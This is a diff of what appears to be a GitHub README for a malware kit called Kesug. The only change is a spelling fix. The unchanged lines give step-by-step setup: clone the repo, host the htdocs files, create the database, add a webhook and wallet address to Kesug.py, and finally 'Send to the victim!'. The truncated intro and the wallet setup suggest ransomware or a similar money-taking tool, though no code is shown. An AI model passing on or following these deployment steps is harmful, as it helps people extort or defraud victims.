@@ -7,7 +7,7 @@ Hi, I'm `f3tch`. About a year ago I was super bored, so I decided to write a **r
 1. **Clone** the repository `git clone https://github.com/f3tchcodes/Kesug.git`
 2. **DOWNLOAD ALL LIBRARY REQUIREMENTS!** I'm too lazy to make the requirement file atm so you'd have to open the code and look through yourself which libraries you'd have to install
 3. Move **htdocs** contents to xampp htdocs folder or your website
-4. Create a **datbase** using **KesugDBStructure**. I don't remember how we had to do it but I suppose you just have to post the files to phpmyadmin
+4. Create a **database** using **KesugDBStructure**. I don't remember how we had to do it but I suppose you just have to post the files to phpmyadmin
 5. Enter your **webhook** in Kesug.py
 6. I suppose that's it but I think there is some information in Kesug.py file like the website, wallet address etc so change that according to your needs
 7. **Send** to the victim!
